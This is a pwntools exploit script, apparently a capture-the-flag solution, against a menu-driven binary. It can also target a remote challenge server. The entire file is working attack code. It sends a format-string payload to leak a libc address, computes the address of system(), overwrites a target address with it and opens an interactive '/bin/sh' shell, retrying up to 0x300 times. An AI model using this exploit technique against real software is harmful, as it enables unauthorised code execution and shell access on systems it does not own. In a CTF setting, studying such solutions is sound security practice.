from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall.patch"
elf = ELF(vuln_path)
libc = elf.libc


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


def pwn(io):
    payload = "t" * 0x100 + "%25$p--%*12$d%13$n".ljust(32, "\x00")
    payload += "/bin/sh"
    io.sendlineafter("2.exit\n", "1")
    io.sendlineafter("to pay?\n", "255")
    io.sendlineafter("report:\n", payload)

    io.sendlineafter("2.exit\n", "1")
    io.sendafter("to pay?\n", p64(0x4) + p64(0x404800))
    leak = int(io.recv(14), 16)
    libc.address = leak - 0x2a1ca
    log.success("libc.address :-----> " + hex(libc.address))

    system_addr = libc.symbols["system"]
    log.success("system :-----> " + hex(system_addr))
    low4 = system_addr & 0xffffffff
    log.success(hex(low4))
    if low4 > 0x20000000:
        return

    ddebug("break *0x004014BC\n break *0x40142D\n continue")
    io.sendlineafter("2.exit\n", "1")
    io.sendafter("to pay?\n", p64(low4 - 16) + p64(0x404080))

    io.sendlineafter("2.exit\n", "/bin/sh")

    io.interactive()


def getio():
    io = process([vuln_path]) if not f_remote else remote("39.106.57.152", 30749)

    return io


for i in range(0x300):
    log.success(f"-----------{i}--------------")
    io = None
    try:
        io = getio()
        pwn(io)
    except Exception as e:
        print(str(e))
    finally:
        if io:
            io.close()
